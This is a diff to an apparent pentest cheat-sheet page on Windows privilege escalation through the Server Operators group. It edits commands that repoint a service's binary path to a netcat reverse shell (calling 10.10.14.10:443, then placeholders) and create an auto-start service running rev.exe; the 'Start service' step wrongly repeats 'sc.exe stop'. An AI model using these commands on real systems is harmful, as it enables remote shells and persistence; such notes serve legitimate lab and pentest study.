@@ -4,22 +4,21 @@ date: 2024-7-13
 tags: ["server operators", "active driectory", "ad", "Windows", "privesc", "service"]
 ---
 
----
 ### Abuse #1: Change service path
 
 <div>
 
-```bash
+```console
 # Change a service path (e.g. browser)
-sc.exe config browser binPath= "C:\ProgramData\nc.exe -e cmd.exe 10.10.14.10 443"
+sc.exe config browser binPath= "C:\ProgramData\nc.exe -e cmd.exe <LOCAL_IP> <LOCAL_PORT>"
 ```
 
-```bash
+```console
 # Stop service
 sc.exe stop browser
 ```
 
-```bash
+```console
 # Start service
 sc.exe stop browser
 ```
@@ -30,7 +29,7 @@ sc.exe stop browser
 
 <div>
 
-```bash
+```console
 # Create a service
 sc.exe create pwn binpath= C:\ProgramData\rev.exe start= auto
 ```
